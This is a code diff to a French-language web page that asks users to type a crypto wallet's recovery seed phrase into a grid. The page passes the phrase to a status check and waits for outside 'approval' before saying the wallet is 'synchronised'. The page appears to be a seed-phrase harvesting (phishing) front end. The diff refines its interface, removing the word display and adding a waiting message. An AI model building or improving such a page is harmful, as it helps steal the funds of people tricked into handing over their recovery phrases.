@@ -131,6 +131,9 @@
             border-radius: 16px;
             font-size: 18px;
             font-weight: 600;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
         }
         .status-pending {
             background: rgba(245,176,66,0.15);
@@ -151,35 +154,6 @@
             background: rgba(59,130,246,0.15);
             color: #3b82f6;
             border: 1px solid rgba(59,130,246,0.3);
-        }
-        .wallet-words {
-            background: rgba(16,185,129,0.1);
-            border: 1px solid rgba(16,185,129,0.2);
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 20px;
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-            text-align: center;
-            color: #10b981;
-        }
-        .btn-go-wallet {
-            margin-top: 15px;
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #f5b042, #e08e1a);
-            border: none;
-            border-radius: 40px;
-            color: #0a0c1a;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        .btn-go-wallet:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(245,176,66,0.3);
         }
         @media (max-width: 600px) {
             .seed-grid { grid-template-columns: repeat(3, 1fr); }
@@ -212,8 +186,6 @@
         </div>
 
         <div id="statusMessage" style="display: none;"></div>
-        <div id="walletWords" style="display: none;" class="wallet-words"></div>
-        <div id="goToWallet" style="display: none;"></div>
 
         <div class="actions">
             <button class="btn btn-secondary" onclick="resetSeed()">
@@ -273,35 +245,9 @@
                 if (input) input.value = '';
             }
             document.getElementById('statusMessage').style.display = 'none';
-            document.getElementById('walletWords').style.display = 'none';
-            document.getElementById('goToWallet').style.display = 'none';
             localStorage.removeItem('seedWords');
             currentStatus = 'pending';
             updateProgress();
-        }
-
-        function showWalletWords(seedPhrase) {
-            const words = seedPhrase.split(' ');
-            const container = document.getElementById('walletWords');
-            container.style.display = 'block';
-            container.innerHTML = `
-                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; text-align: center; margin-top: 10px;">
-                    ${words.map((word, index) => `
-                        <div style="background: rgba(16,185,129,0.05); padding: 6px; border-radius: 8px;">
-                            <span style="font-size: 10px; color: #8b8cae;">mot ${index + 1}</span><br>
-                            <span style="font-weight: 600;">${word}</span>
-                        </div>
-                    `).join('')}
-                </div>
-            `;
-            
-            const btnContainer = document.getElementById('goToWallet');
-            btnContainer.style.display = 'block';
-            btnContainer.innerHTML = `
-                <button class="btn-go-wallet" onclick="window.location.href='dashboard.html'">
-                    <i class="fas fa-wallet"></i> Accéder au portefeuille
-                </button>
-            `;
         }
 
         async function checkStatus(seedPhrase) {
@@ -347,18 +293,20 @@
             if (statusCheck && statusCheck.success) {
                 currentStatus = statusCheck.status;
                 
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.style.display = 'block';
+                
                 if (statusCheck.status === 'approved') {
-                    const statusDiv = document.getElementById('statusMessage');
-                    statusDiv.style.display = 'block';
                     statusDiv.className = 'status-box status-approved';
                     statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                    showWalletWords(seedPhrase);
                     return;
                 } else if (statusCheck.status === 'rejected') {
-                    const statusDiv = document.getElementById('statusMessage');
-                    statusDiv.style.display = 'block';
                     statusDiv.className = 'status-box status-rejected';
                     statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
+                    return;
+                } else {
+                    statusDiv.className = 'status-box status-pending';
+                    statusDiv.innerHTML = '⏳ Attente de synchronisation...';
                     return;
                 }
             }
@@ -393,20 +341,13 @@
             }
         }
 
-        // PAS DE CHARGEMENT AUTOMATIQUE DES MOTS SAUVEGARDÉS
-        // Les cases restent vides quand l'utilisateur revient
+        // Ne pas charger automatiquement les mots
         function checkSavedSeed() {
-            // Ne pas remplir les cases automatiquement
-            // On garde juste la vérification du statut sans afficher les mots
-            const savedWords = localStorage.getItem('seedWords');
-            if (savedWords) {
-                // On ne remplit PAS les cases
-                // On vérifie juste le statut silencieusement
-            }
+            // Ne rien faire - les cases restent vides
         }
 
         generateSeedFields();
-        // On ne charge pas automatiquement les mots
+        // Pas de chargement automatique
     </script>
 </body>
 </html>
